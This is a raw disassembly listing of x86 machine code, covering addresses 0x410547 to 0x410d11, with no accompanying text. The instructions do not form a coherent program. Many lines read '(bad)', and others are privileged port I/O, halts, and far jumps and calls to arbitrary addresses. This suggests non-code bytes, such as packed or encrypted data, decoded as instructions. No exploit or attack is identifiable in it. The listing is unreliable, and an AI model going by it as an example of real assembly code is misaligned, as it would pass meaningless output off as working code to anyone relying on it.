  410547:	mov    esi,0xd27b470b
  41054c:	ins    BYTE PTR es:[edi],dx
  41054d:	adc    edx,DWORD PTR ds:0x91166d57
  410553:	cmp    DWORD PTR [edx-0x63],eax
  410556:	scas   eax,DWORD PTR es:[edi]
  410557:	xor    eax,0x2bbee12b
  41055c:	jbe    0x410599
  41055e:	add    bl,cl
  410560:	scas   al,BYTE PTR es:[edi]
  410561:	xchg   ebp,eax
  410562:	push   eax
  410563:	ret    
  410564:	jno    0x41057d
  410566:	(bad)  
  410567:	and    al,0x9c
  410569:	inc    edx
  41056a:	cs pop ds
  41056c:	stc    
  41056d:	shl    BYTE PTR [eax-0x35],0x1f
  410571:	xlat   BYTE PTR ds:[ebx]
  410572:	dec    ebx
  410573:	mov    es:0xd05dc088,eax
  410579:	push   esp
  41057a:	sbb    ecx,esi
  41057c:	mul    BYTE PTR [ecx-0x47102c9b]
  410582:	xchg   esi,eax
  410583:	scas   al,BYTE PTR es:[edi]
  410584:	in     eax,0x9c
  410586:	xchg   BYTE PTR [ebx],al
  410588:	cs dec edi
  41058a:	aad    0xe2
  41058c:	ds pop ebp
  41058e:	sub    eax,0x78ce14b3
  410593:	cmc    
  410594:	shl    BYTE PTR [edi],0x8
  410597:	pop    edx
  410598:	jg     0x4105fd
  41059a:	add    DWORD PTR [ebp+edi*1+0x34a8c2da],0xfffffff3
  4105a2:	push   ss
  4105a3:	push   es
  4105a4:	mov    ecx,DWORD PTR ds:0x65b51bb9
  4105aa:	stos   DWORD PTR es:[edi],eax
  4105ab:	(bad)  
  4105ac:	outs   dx,BYTE PTR ds:[esi]
  4105ad:	xor    DWORD PTR [ecx],ecx
  4105af:	inc    ecx
  4105b0:	inc    ecx
  4105b1:	xchg   BYTE PTR [edx+0x4c],dl
  4105b4:	inc    esi
  4105b5:	call   0x10cd941b
  4105ba:	hlt    
  4105bb:	push   ds
  4105bc:	in     eax,0x92
  4105be:	add    al,0xb1
  4105c0:	push   cs
  4105c1:	dec    esp
  4105c2:	(bad)  
  4105c3:	int3   
  4105c4:	lods   al,BYTE PTR ds:[esi]
  4105c5:	or     ecx,DWORD PTR [ecx]
  4105c7:	aaa    
  4105c8:	jg     0x410608
  4105ca:	sbb    al,0x90
  4105cc:	test   dh,0x34
  4105cf:	aas    
  4105d0:	jno    0x4105be
  4105d2:	clc    
  4105d3:	inc    eax
  4105d4:	xchg   esp,eax
  4105d5:	cs pop es
  4105d7:	enter  0x5e41,0x4f
  4105db:	(bad)  
  4105dc:	jl     0x41063c
  4105de:	sub    eax,0xb2d0eef
  4105e3:	pop    ebp
  4105e4:	push   es
  4105e5:	adc    DWORD PTR [esi],edx
  4105e7:	and    BYTE PTR [edi],0x70
  4105ea:	or     ebp,ebp
  4105ec:	xchg   DWORD PTR ds:0x10bfdce0,ecx
  4105f2:	jle    0x4105d6
  4105f4:	(bad)  
  4105f5:	mov    ds:0x620d371b,al
  4105fa:	cmp    eax,0x47c4420c
  4105ff:	and    eax,0xfcd0a180
  410604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410605:	adc    DWORD PTR [edi+ebx*4],esi
  410608:	xchg   esi,eax
  410609:	pusha  
  41060a:	inc    edx
  41060b:	iret   
  41060c:	jmp    0x410635
  41060e:	pusha  
  41060f:	lahf   
  410610:	mov    ebx,DWORD PTR [edi+0x27]
  410613:	pop    ss
  410614:	push   0xe5772ff6
  410619:	not    bh
  41061b:	mov    ss,eax
  41061d:	pop    esp
  41061e:	jge    0x4105c3
  410620:	dec    edx
  410621:	fisub  DWORD PTR [esp+eax*2]
  410624:	nop
  410625:	and    edx,DWORD PTR [ecx]
  410627:	repnz pop es
  410629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41062a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41062b:	xchg   dl,ch
  41062d:	inc    edi
  41062e:	rol    BYTE PTR [eax+esi*1-0x622eed86],1
  410635:	or     eax,0xf2cad21a
  41063a:	outs   dx,BYTE PTR ds:[esi]
  41063b:	and    esi,ebp
  41063d:	iret   
  41063e:	rcr    ch,0x19
  410641:	mov    eax,0x926e05f5
  410646:	jne    0x4106bd
  410648:	mov    ecx,0x91cebc83
  41064d:	pop    esi
  41064e:	sbb    ebx,edx
  410650:	gs mov edi,0x511c3d1b
  410656:	cdq    
  410657:	sbb    dl,BYTE PTR [edi+0x5def7fd9]
  41065d:	sub    ebx,ebp
  41065f:	dec    edx
  410660:	mov    edi,0x2fd89060
  410665:	cmp    bl,BYTE PTR [eax-0x4e]
  410668:	or     eax,0x9fd3b4ca
  41066d:	pop    eax
  41066e:	xor    BYTE PTR [ebx+esi*1],ch
  410671:	sub    bh,BYTE PTR [ebx]
  410673:	icebp  
  410674:	mov    ebp,0x2030fc95
  410679:	repz shl DWORD PTR [ebx-0x2e],cl
  41067d:	mov    edi,0x2ca0b176
  410682:	push   ebx
  410683:	sbb    al,0x8c
  410685:	stos   BYTE PTR es:[edi],al
  410686:	xor    esi,edi
  410688:	cdq    
  410689:	imul   esp,DWORD PTR [edx+esi*2],0x74
  41068d:	ror    bh,0x71
  410690:	inc    esp
  410691:	mov    bh,dl
  410693:	cmp    bh,BYTE PTR [ebx]
  410695:	mov    dh,0x66
  410697:	lock outs dx,DWORD PTR es:[esi]
  41069a:	in     eax,dx
  41069b:	jmp    0x45f5f37
  4106a0:	call   0xf48c:0xec996e27
  4106a7:	xchg   edi,eax
  4106a8:	add    ecx,DWORD PTR [edx]
  4106aa:	jecxz  0x4106b7
  4106ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106ad:	fnstenv [ebx-0x35]
  4106b0:	jns    0x410708
  4106b2:	push   ebp
  4106b3:	icebp  
  4106b4:	cmp    al,0xe
  4106b6:	xchg   esp,eax
  4106b7:	test   DWORD PTR [edx+0x679908f6],ebx
  4106bd:	adc    eax,0x1a8edab1
  4106c2:	cmc    
  4106c3:	lahf   
  4106c4:	mov    bl,0x56
  4106c7:	xor    DWORD PTR [edi+0x165d3f59],eax
  4106cd:	xor    dl,0xb0
  4106d0:	xor    ch,BYTE PTR [edx]
  4106d2:	xor    eax,0x7bc38583
  4106d7:	inc    DWORD PTR [edx-0x191967f7]
  4106dd:	inc    edi
  4106de:	ucomiss xmm2,DWORD PTR [esi]
  4106e1:	jge    0x41071d
  4106e3:	cmp    BYTE PTR [ecx-0x7c9464af],bl
  4106e9:	xor    ebp,esp
  4106eb:	mov    gs,WORD PTR [eax]
  4106ed:	shl    edi,1
  4106ef:	pusha  
  4106f0:	jnp    0x41072c
  4106f2:	retf   0x54d7
  4106f5:	lods   al,BYTE PTR ds:[esi]
  4106f6:	rcl    BYTE PTR [edi],1
  4106f8:	out    0x81,eax
  4106fa:	add    al,0x73
  4106fc:	xchg   DWORD PTR [esi],esi
  4106fe:	(bad)
  410702:	aas    
  410703:	mov    dh,0x6d
  410705:	lock mov ebx,ss
  410708:	push   0xb61645e5
  41070d:	xchg   ecx,eax
  41070e:	add    ebx,ecx
  410710:	ret    
  410711:	dec    ebx
  410712:	lods   al,BYTE PTR ds:[esi]
  410713:	lahf   
  410714:	lods   eax,DWORD PTR ds:[esi]
  410715:	(bad)
  410719:	mov    ebx,ebp
  41071b:	jmp    0x410704
  41071d:	ds jmp 0xfae703e5
  410723:	clc    
  410724:	inc    ecx
  410725:	mov    ds:0xee27da55,eax
  41072a:	jge    0x41079b
  41072c:	mov    ch,0x32
  41072e:	lock sbb dl,al
  410731:	cwde   
  410732:	inc    edx
  410733:	mov    eax,0xc3a321d7
  410738:	add    bh,BYTE PTR [ebx+0x27]
  41073b:	mov    ds:0x47b975db,eax
  410740:	pop    edx
  410741:	cmp    dh,BYTE PTR [edi+eax*8+0x48]
  410745:	and    BYTE PTR [ecx],0x38
  410748:	rcr    DWORD PTR [ecx+0x79],cl
  41074b:	fiadd  WORD PTR [esi-0x49479aa6]
  410751:	inc    eax
  410752:	into   
  410753:	les    ebp,FWORD PTR [ebx]
  410755:	(bad)  
  410757:	or     al,0x66
  410759:	adc    eax,0xf1dc3480
  41075e:	jmp    0x669f16c5
  410763:	pop    edi
  410764:	cmp    BYTE PTR [ebp-0xc9717b9],ah
  41076a:	pushf  
  41076b:	lahf   
  41076c:	ins    DWORD PTR es:[edi],dx
  41076d:	mov    eax,ds:0x8f9d0f26
  410772:	iret   
  410773:	mov    edi,0x8f7314a0
  410778:	and    al,0xd4
  41077a:	pop    es
  41077b:	repz pop esi
  41077d:	sbb    al,0xdb
  41077f:	mov    ds:0xf4485422,al
  410784:	out    0x6c,eax
  410786:	and    eax,0xa9812f1d
  41078b:	jecxz  0x410761
  41078d:	mov    DWORD PTR [esi+ebp*1-0x273080f8],edi
  410794:	loop   0x41079c
  410796:	add    bl,BYTE PTR [edx+ecx*4]
  410799:	data16 xchg BYTE PTR [ecx+edx*4-0x198ece06],bl
  4107a1:	add    al,0x97
  4107a3:	xor    dl,BYTE PTR [ebx]
  4107a5:	out    0xaa,al
  4107a7:	retf   0xa70
  4107aa:	push   0xb7b0e008
  4107af:	scas   al,BYTE PTR es:[edi]
  4107b0:	sub    edi,DWORD PTR [ebp-0x7afcd3f6]
  4107b6:	int3   
  4107b7:	push   cs
  4107b8:	stos   BYTE PTR es:[edi],al
  4107b9:	push   ds
  4107ba:	and    edi,DWORD PTR [eax-0x45]
  4107bd:	fdivr  DWORD PTR [ebx+0x5bd58549]
  4107c3:	or     eax,0x67ae921e
  4107c8:	sub    ecx,ecx
  4107ca:	push   0xce93b2c0
  4107cf:	jecxz  0x41076e
  4107d1:	test   BYTE PTR [esi-0x56c645ec],bl
  4107d7:	pop    edi
  4107d8:	adc    al,0xe0
  4107da:	in     al,dx
  4107db:	dec    ecx
  4107dc:	ss dec ebp
  4107de:	jne    0x410844
  4107e0:	bound  esi,QWORD PTR [ecx-0x68]
  4107e3:	push   cs
  4107e4:	out    0xf2,al
  4107e6:	ror    DWORD PTR ds:0xa59bf012,0x55
  4107ed:	into   
  4107ee:	ja     0x4107c7
  4107f0:	outs   dx,DWORD PTR ds:[esi]
  4107f1:	(bad)  
  4107f2:	cmp    ebx,eax
  4107f4:	push   ecx
  4107f5:	pop    edx
  4107f6:	imul   ebx,DWORD PTR [esi],0x425956ce
  4107fc:	or     DWORD PTR [edi],0xfc361bc3
  410802:	xchg   ebp,eax
  410803:	enter  0xa0b3,0x8a
  410807:	mov    bl,0x7c
  410809:	retf   0xcd7c
  41080c:	or     al,0x95
  41080e:	iret   
  41080f:	jecxz  0x4107a7
  410811:	jae    0x410870
  410813:	and    eax,0x62bb676e
  410818:	adc    dl,bl
  41081a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41081b:	pop    edx
  41081c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41081d:	sbb    al,0xf0
  41081f:	outs   dx,BYTE PTR ds:[esi]
  410820:	shl    BYTE PTR [ecx+0x48d89550],0xf4
  410827:	push   0x75
  410829:	je     0x41080b
  41082b:	sub    al,0x7
  41082d:	add    ebx,ebp
  41082f:	and    BYTE PTR [edx],cl
  410831:	das    
  410832:	sbb    esi,DWORD PTR [edi-0x7b]
  410835:	fst    QWORD PTR [eax-0x3c]
  410838:	dec    edi
  410839:	push   edx
  41083a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41083b:	cwde   
  41083c:	sbb    edi,esi
  41083e:	inc    edx
  41083f:	adc    DWORD PTR [edx+0x61436251],ebp
  410845:	sahf   
  410846:	repz or ebp,DWORD PTR es:[ebp-0x4c6f55e0]
  41084e:	stc    
  41084f:	or     BYTE PTR [eax+0x22],cl
  410852:	loopne 0x4107e4
  410854:	sahf   
  410855:	fcmovbe st,st(2)
  410857:	and    dl,BYTE PTR ds:0x9b758bfa
  41085d:	push   edi
  41085e:	daa    
  41085f:	nop
  410860:	sti    
  410861:	mov    eax,0xa3e9157f
  410866:	not    BYTE PTR [eax+0x31]
  410869:	inc    eax
  41086a:	inc    ecx
  41086b:	xor    esi,DWORD PTR [eax+0x65]
  41086e:	loopne 0x41088a
  410870:	inc    esp
  410871:	push   ebp
  410872:	mov    esi,edx
  410874:	in     al,0x45
  410876:	dec    BYTE PTR [edx+0x2d]
  410879:	xchg   esi,eax
  41087a:	or     dl,dh
  41087c:	dec    ebp
  41087d:	dec    ebp
  41087e:	push   eax
  41087f:	push   ecx
  410880:	scas   eax,DWORD PTR es:[edi]
  410881:	lock or DWORD PTR [edx],edx
  410884:	cmp    ch,ah
  410886:	dec    edi
  410887:	pop    esi
  410888:	fcom   st(3)
  41088a:	xor    bl,BYTE PTR [ecx-0xb6304fc]
  410890:	inc    esp
  410891:	jmp    0x322b:0x8e7d1947
  410898:	cli    
  410899:	bnd fs jbe 0x41089f
  41089d:	je     0x410856
  41089f:	push   ebx
  4108a0:	data16 mov ch,0xee
  4108a3:	clc    
  4108a4:	leave  
  4108a5:	cmp    ebp,DWORD PTR [ebx+0x5b993991]
  4108ab:	hlt    
  4108ac:	in     eax,dx
  4108ad:	mov    al,0x29
  4108af:	mov    BYTE PTR [edi+edi*8-0xc30c14a],dh
  4108b6:	inc    esp
  4108b7:	daa    
  4108b8:	xor    al,0xc8
  4108ba:	sti    
  4108bb:	and    eax,0x4874ce70
  4108c0:	pop    es
  4108c1:	fisubr WORD PTR gs:0x62c32ae
  4108c8:	and    bh,BYTE PTR [edi-0x3]
  4108cb:	sbb    BYTE PTR [edi-0x2a146d21],ch
  4108d1:	test   DWORD PTR [ecx-0x6],esp
  4108d4:	push   ebx
  4108d5:	xor    dh,BYTE PTR [eax-0x283a10b5]
  4108db:	leave  
  4108dc:	pop    eax
  4108dd:	sbb    al,0xab
  4108df:	dec    edi
  4108e0:	scas   eax,DWORD PTR es:[edi]
  4108e1:	fsubr  st,st(7)
  4108e3:	cli    
  4108e4:	xlat   BYTE PTR ds:[ebx]
  4108e5:	push   DWORD PTR [ebx+0x45]
  4108e8:	inc    edi
  4108e9:	or     DWORD PTR [esi+edi*4-0x3d236a11],edi
  4108f0:	popa   
  4108f1:	sbb    al,0x4c
  4108f3:	mov    eax,ds:0x730f46f5
  4108f8:	sbb    BYTE PTR [eax+ebx*8-0x31],0xb4
  4108fd:	sbb    ah,BYTE PTR [ebp+0x35]
  410900:	outs   dx,DWORD PTR ds:[esi]
  410901:	xchg   edx,eax
  410902:	stos   DWORD PTR es:[edi],eax
  410903:	in     al,dx
  410904:	push   0x7b8a0ab7
  410909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41090a:	push   0xf375a267
  41090f:	sti    
  410910:	pop    es
  410911:	xor    ah,BYTE PTR [esp+edx*2+0x18]
  410915:	add    ah,0x98
  410918:	ja     0x41095e
  41091a:	inc    ebp
  41091b:	xor    al,0xf7
  41091d:	inc    esp
  41091e:	stc    
  41091f:	dec    esi
  410920:	push   eax
  410921:	pop    es
  410922:	fcom   st(7)
  410924:	adc    BYTE PTR [ebp+0x250b9aa8],0x8d
  41092b:	xchg   esi,eax
  41092c:	mov    ebp,0xc5352613
  410931:	mov    ebx,0x1c5e05fb
  410936:	(bad)  
  410937:	mov    edi,0x9286dff
  41093c:	test   DWORD PTR [eax],edi
  41093e:	nop
  41093f:	add    bl,al
  410941:	sbb    al,0x38
  410943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410944:	push   es
  410945:	pop    ebx
  410946:	push   ebx
  410947:	mov    WORD PTR [ebx-0x69],ds
  41094a:	addr16 or eax,0x8368459a
  410950:	xor    bh,BYTE PTR [ecx]
  410952:	loopne 0x41095e
  410954:	cmp    edi,DWORD PTR [esi]
  410956:	mov    esi,0xc8975783
  41095b:	ja     0x410905
  41095d:	mov    ebp,0xce5e89e
  410962:	dec    ebx
  410963:	cmp    edi,DWORD PTR [ebp-0x74]
  410966:	retf   
  410967:	xor    DWORD PTR [ebx],0xbccb5f34
  41096d:	popa   
  41096e:	outs   dx,BYTE PTR ds:[esi]
  41096f:	dec    BYTE PTR [edi+0x5202352d]
  410975:	leave  
  410976:	xchg   ebp,eax
  410977:	call   ecx
  410979:	in     al,dx
  41097a:	or     DWORD PTR [esi+esi*1],edx
  41097d:	mul    ch
  41097f:	lods   al,BYTE PTR ds:[esi]
  410980:	popa   
  410981:	xchg   ebp,eax
  410982:	mov    ebx,0xa3e746b
  410987:	aad    0x9d
  410989:	dec    edx
  41098a:	scas   al,BYTE PTR es:[edi]
  41098b:	sub    esi,DWORD PTR [edi-0x18]
  41098e:	jle    0x4109ff
  410990:	inc    edx
  410991:	pop    ebp
  410992:	push   cs
  410993:	ins    BYTE PTR es:[edi],dx
  410994:	xchg   esi,eax
  410995:	dec    eax
  410996:	es scas eax,DWORD PTR es:[edi]
  410998:	sbb    BYTE PTR [edi],cl
  41099a:	mov    ecx,0x7cc4a513
  41099f:	xor    BYTE PTR [ebx-0x43],al
  4109a2:	add    eax,0x61fabb72
  4109a7:	mov    eax,ds:0xb09ec99c
  4109ac:	xchg   esp,eax
  4109ad:	xchg   BYTE PTR [ecx-0x36],ah
  4109b0:	dec    eax
  4109b1:	xchg   esi,eax
  4109b2:	mov    esp,0xe3ed598c
  4109b7:	dec    edi
  4109b8:	mov    esp,0xd3ee8cd0
  4109bd:	aaa    
  4109be:	jmp    0x87ec867f
  4109c3:	lds    ebx,FWORD PTR [eax]
  4109c5:	pop    esp
  4109c6:	cs and eax,0x12c64e21
  4109cc:	or     ch,dh
  4109ce:	xor    DWORD PTR [ebx-0x1449feca],eax
  4109d4:	lahf   
  4109d5:	or     BYTE PTR [eax-0x448f8e3],dh
  4109db:	lods   eax,DWORD PTR fs:[esi]
  4109dd:	ret    0xc753
  4109e0:	ja     0x410964
  4109e2:	jnp    0x410a11
  4109e4:	or     al,0xba
  4109e6:	test   DWORD PTR [eax-0x3b],0xf3896337
  4109ed:	push   esp
  4109ee:	clc    
  4109ef:	pop    ebp
  4109f0:	mov    DWORD PTR [edx-0x5b06f06c],ebp
  4109f6:	dec    ebx
  4109f7:	retf   
  4109f8:	pop    eax
  4109f9:	in     eax,dx
  4109fa:	mov    al,ds:0x717a997a
  4109ff:	add    eax,0xecfe56fd
  410a04:	mov    BYTE PTR [ebx],bh
  410a06:	mov    dl,0xbb
  410a08:	xor    ebx,esp
  410a0a:	fs mov ecx,0xb4d16be1
  410a10:	or     eax,edi
  410a12:	jno    0x410a62
  410a14:	js     0x4109aa
  410a16:	nop
  410a17:	pop    es
  410a18:	icebp  
  410a19:	xlat   BYTE PTR ds:[ebx]
  410a1a:	stc    
  410a1b:	stos   DWORD PTR es:[edi],eax
  410a1c:	clc    
  410a1d:	test   al,cl
  410a1f:	xchg   ecx,eax
  410a20:	popf   
  410a21:	imul   esp,DWORD PTR [edi+eax*1+0x24],0x9c84c243
  410a29:	xor    al,0x5d
  410a2b:	call   0xfc117aef
  410a30:	cmp    ecx,DWORD PTR [edi]
  410a32:	or     ebx,edi
  410a34:	fwait
  410a35:	push   esi
  410a36:	int    0xd5
  410a38:	xchg   BYTE PTR [ecx],bl
  410a3a:	sbb    dl,BYTE PTR [edi]
  410a3c:	inc    esi
  410a3d:	add    BYTE PTR [eax],ch
  410a3f:	retf   0x6acb
  410a42:	mov    dl,0x0
  410a44:	test   eax,0x9890c6ed
  410a49:	xor    ebp,eax
  410a4b:	in     eax,dx
  410a4c:	lea    esi,[ebp-0x28]
  410a4f:	pop    ecx
  410a50:	addr16 xchg esi,eax
  410a52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a53:	push   esi
  410a54:	add    bl,BYTE PTR [edx]
  410a56:	outs   dx,DWORD PTR ds:[esi]
  410a57:	(bad)  
  410a58:	mov    eax,DWORD PTR [ebx-0x4c577ca]
  410a5e:	ins    DWORD PTR es:[edi],dx
  410a5f:	push   edi
  410a60:	int    0xc1
  410a62:	push   eax
  410a63:	or     cl,BYTE PTR [esi]
  410a65:	xchg   esp,eax
  410a66:	sti    
  410a67:	sbb    cl,BYTE PTR [edi-0x48]
  410a6a:	push   edi
  410a6b:	xchg   BYTE PTR [ebp-0x6e],bh
  410a6e:	scas   al,BYTE PTR es:[edi]
  410a6f:	arpl   WORD PTR [ebx-0x7ddf29ac],cx
  410a75:	pop    ss
  410a76:	xchg   ebx,eax
  410a77:	or     ch,bl
  410a79:	adc    bh,BYTE PTR [edx+0x2cdce92b]
  410a7f:	stos   BYTE PTR es:[edi],al
  410a80:	dec    ecx
  410a81:	and    BYTE PTR [esp+ebp*8-0x66f231],bh
  410a88:	hlt    
  410a89:	sub    ah,BYTE PTR [edi-0x68]
  410a8c:	push   es
  410a8d:	mov    edx,0x9c6bbe3d
  410a92:	dec    esi
  410a93:	mov    edi,0x6b9f1e8c
  410a98:	scas   al,BYTE PTR es:[edi]
  410a99:	adc    cl,BYTE PTR [edx+ebp*2-0x3e982d4]
  410aa0:	push   ecx
  410aa1:	mov    dl,0x43
  410aa3:	and    BYTE PTR [edx],cl
  410aa5:	cwde   
  410aa6:	add    ch,BYTE PTR [ecx-0x6dee9241]
  410aac:	call   0xc46e583a
  410ab1:	ins    BYTE PTR es:[edi],dx
  410ab2:	adc    esi,DWORD PTR [edx-0x84801ec]
  410ab8:	loope  0x410ad0
  410aba:	dec    edi
  410abb:	jbe    0x410a7b
  410abd:	scas   eax,DWORD PTR es:[edi]
  410abe:	jl     0x410a4a
  410ac0:	in     al,0x3
  410ac2:	clc    
  410ac3:	mov    edx,0xdabde606
  410ac8:	pop    edi
  410ac9:	dec    ecx
  410aca:	mov    BYTE PTR [edi],dh
  410acc:	xchg   edi,eax
  410acd:	sub    al,ah
  410acf:	cli    
  410ad0:	xor    BYTE PTR [ecx+0x1fbbaff2],bh
  410ad6:	cs fild WORD PTR cs:[eax-0x2b]
  410adb:	jp     0x410a8e
  410add:	jnp    0x410afa
  410adf:	xor    eax,0x9d9d909d
  410ae4:	add    BYTE PTR [edx+esi*4-0x707d20da],ah
  410aeb:	pop    ebp
  410aec:	sbb    DWORD PTR [esi+0x5d5311e6],ebp
  410af2:	jae    0x410af3
  410af4:	mov    ss,WORD PTR [ebp-0x42b03d31]
  410afa:	push   eax
  410afb:	shr    BYTE PTR [ebx-0x4a5df74b],cl
  410b01:	mov    DWORD PTR [esi],0xd8aa36e0
  410b07:	sub    al,0xec
  410b09:	dec    ebx
  410b0a:	push   edi
  410b0b:	pusha  
  410b0c:	pop    ebx
  410b0d:	mov    edx,0xbf93753d
  410b12:	(bad)  
  410b13:	add    ebp,esi
  410b15:	les    esi,FWORD PTR [edi]
  410b17:	lods   al,BYTE PTR ds:[esi]
  410b18:	push   ds
  410b19:	add    DWORD PTR [ebp-0x44],edx
  410b1c:	mov    eax,ds:0xe716fc00
  410b21:	lahf   
  410b22:	clc    
  410b23:	jns    0x410ade
  410b25:	sub    ah,BYTE PTR [eax+0x2e]
  410b28:	sti    
  410b29:	dec    eax
  410b2a:	and    esi,DWORD PTR [edi+0x418d8dad]
  410b30:	pop    esp
  410b31:	mov    ds:0x9ea941db,al
  410b36:	pusha  
  410b37:	sbb    DWORD PTR [eax-0x80],0xfffffff9
  410b3b:	in     al,0x83
  410b3d:	cwde   
  410b3e:	call   0xb74644b2
  410b43:	sti    
  410b44:	and    edx,DWORD PTR ds:0xa93e9806
  410b4a:	ins    DWORD PTR es:[edi],dx
  410b4b:	lods   eax,DWORD PTR ds:[esi]
  410b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b4d:	jo     0x410b54
  410b4f:	adc    eax,0x84bc9fb4
  410b54:	pop    esp
  410b55:	into   
  410b56:	mov    ecx,0x801d3318
  410b5b:	dec    ecx
  410b5c:	jmp    0x77359856
  410b61:	jl     0x410af9
  410b63:	dec    ecx
  410b64:	dec    edx
  410b65:	fild   WORD PTR [eax-0x7c3fde7f]
  410b6b:	imul   ebx,DWORD PTR [edi+0x42],0x1b43fbd9
  410b72:	in     eax,0x0
  410b74:	push   cs
  410b75:	push   ds
  410b76:	pop    eax
  410b77:	outs   dx,BYTE PTR ds:[esi]
  410b78:	jg     0x410b52
  410b7a:	push   esi
  410b7b:	adc    eax,0xdeedbc49
  410b80:	inc    eax
  410b81:	ins    BYTE PTR es:[edi],dx
  410b82:	mov    al,ds:0xf2af6515
  410b87:	les    ebx,FWORD PTR [ebx+0x1e9188a6]
  410b8d:	into   
  410b8e:	mov    bl,0x2c
  410b90:	daa    
  410b91:	or     dl,bh
  410b93:	xchg   esp,eax
  410b94:	fld    DWORD PTR [esi*2-0x2a9fbdbf]
  410b9b:	cmp    BYTE PTR [eax-0x2abeaa50],dl
  410ba1:	lahf   
  410ba2:	push   ds
  410ba3:	push   esp
  410ba4:	push   ebp
  410ba5:	push   esp
  410ba6:	fs cmp ch,dh
  410ba9:	test   eax,0xf5d2765c
  410bae:	mov    ds:0xfe0004f1,al
  410bb3:	and    dl,BYTE PTR [ebx]
  410bb5:	sbb    esp,edi
  410bb7:	push   ds
  410bb8:	test   BYTE PTR [ebp+0x4b4cf607],dl
  410bbe:	adc    DWORD PTR [ecx+0x27e71c3e],edx
  410bc4:	inc    ecx
  410bc5:	call   0x816c1b3d
  410bca:	mov    al,ds:0xa334a12e
  410bcf:	pop    eax
  410bd0:	cmp    DWORD PTR [esi],esp
  410bd2:	mov    esp,0xc9148a4c
  410bd7:	and    dh,BYTE PTR [ebx]
  410bd9:	adc    al,0xb8
  410bdb:	cmp    edi,ebx
  410bdd:	mov    ds,WORD PTR [edi+0x4339fcdb]
  410be3:	pop    esi
  410be4:	neg    BYTE PTR [edi+0x4c]
  410be7:	dec    eax
  410be8:	xchg   esi,eax
  410be9:	jmp    0x410bf4
  410beb:	xchg   bl,bh
  410bed:	push   esp
  410bee:	imul   ebp,DWORD PTR [ebx],0xba9e6456
  410bf4:	pop    edi
  410bf5:	jmp    0xc89ee0e0
  410bfa:	leave  
  410bfb:	push   DWORD PTR [ebp+0x67]
  410bfe:	add    DWORD PTR [ecx],ecx
  410c00:	test   eax,0x844b5aad
  410c05:	pop    edi
  410c06:	adc    BYTE PTR [edx+0x26d7bd47],ah
  410c0c:	leave  
  410c0d:	or     eax,DWORD PTR [edi]
  410c0f:	das    
  410c10:	inc    ebp
  410c11:	xor    bl,bl
  410c13:	pop    ebp
  410c14:	dec    ecx
  410c15:	into   
  410c16:	dec    eax
  410c17:	ins    BYTE PTR es:[edi],dx
  410c18:	or     cl,cl
  410c1a:	aad    0x1a
  410c1c:	stos   DWORD PTR es:[edi],eax
  410c1d:	vpsubusb ymm6,ymm6,YMMWORD PTR ds:0x37dafc79
  410c25:	mov    esp,0x6defbd9d
  410c2a:	xchg   esp,eax
  410c2b:	data16 out 0x2c,al
  410c2e:	jp     0x410c1b
  410c30:	sbb    al,0x7c
  410c32:	scas   al,BYTE PTR es:[edi]
  410c33:	push   0x344a0f2a
  410c38:	sbb    eax,0xbe68305a
  410c3d:	adc    al,0x12
  410c3f:	sbb    BYTE PTR [ebp+0x49],al
  410c42:	push   esp
  410c43:	arpl   WORD PTR [edx-0x17598445],si
  410c49:	cmp    al,0x74
  410c4b:	jmp    0xbe18:0x952e19fe
  410c52:	ja     0x410c0b
  410c54:	mov    al,ds:0x60f73a5
  410c59:	loopne 0x410c8d
  410c5b:	cli    
  410c5c:	jmp    0x787b6e4b
  410c61:	ficomp DWORD PTR [ecx]
  410c63:	fsub   st(1),st
  410c65:	lods   eax,DWORD PTR ds:[esi]
  410c66:	add    eax,0x5815c6dd
  410c6b:	xchg   ecx,eax
  410c6c:	mov    ebp,0xbc0024ca
  410c71:	inc    esi
  410c72:	sbb    eax,0xd9691ad4
  410c77:	cmc    
  410c78:	xor    bl,BYTE PTR [ebx+0x7bdec917]
  410c7e:	test   BYTE PTR fs:[ecx+0x27],ah
  410c82:	push   ebx
  410c83:	call   DWORD PTR [ecx+edi*2-0x7f]
  410c87:	addr16 mov bl,0xcd
  410c8a:	push   edx
  410c8b:	or     DWORD PTR ds:0x129875c6,ebx
  410c91:	sbb    al,0x90
  410c93:	xchg   ecx,eax
  410c94:	push   0x38
  410c96:	adc    al,ah
  410c98:	sbb    esi,ebx
  410c9a:	mov    edx,0xe4518a3
  410c9f:	add    DWORD PTR [ecx*2+0x401bac98],0x1f7c2572
  410caa:	popa   
  410cab:	add    al,0x3c
  410cad:	sbb    edx,DWORD PTR [ebx+ecx*4-0x58]
  410cb1:	in     al,dx
  410cb2:	out    dx,al
  410cb3:	cmp    eax,0x964644f5
  410cb8:	(bad)  
  410cba:	(bad)  
  410cbb:	sub    bh,bl
  410cbd:	sub    BYTE PTR [edi],cl
  410cbf:	inc    esp
  410cc0:	sub    BYTE PTR [ebx+0x4c4f0600],cl
  410cc6:	shl    BYTE PTR [eax-0x5039003d],cl
  410ccc:	scas   eax,DWORD PTR es:[edi]
  410ccd:	pop    ds
  410cce:	and    bl,cl
  410cd0:	inc    edx
  410cd1:	jp     0x410ca1
  410cd3:	sub    eax,0x2d7b1524
  410cd8:	sub    al,0x28
  410cda:	xlat   BYTE PTR ds:[ebx]
  410cdb:	aaa    
  410cdc:	cli    
  410cdd:	cdq    
  410cde:	mov    ah,0x36
  410ce0:	test   DWORD PTR ds:0xd9c244f4,edi
  410ce6:	jmp    DWORD PTR [ebx*4-0x5e1610f7]
  410ced:	xor    eax,0x891d84a1
  410cf2:	into   
  410cf3:	lds    ebp,FWORD PTR [ecx+eax*2+0x31ad01d3]
  410cfa:	retf   
  410cfb:	push   cs
  410cfc:	xor    eax,0x2a78a4ae
  410d01:	add    DWORD PTR [ebp-0xcfbed65],edi
  410d07:	and    al,0xd1
  410d09:	out    dx,eax
  410d0a:	fcom   QWORD PTR [esi-0x392d28e1]
  410d10:	(bad)  
  410d11:	jmp    0x6259:0x559ca73a
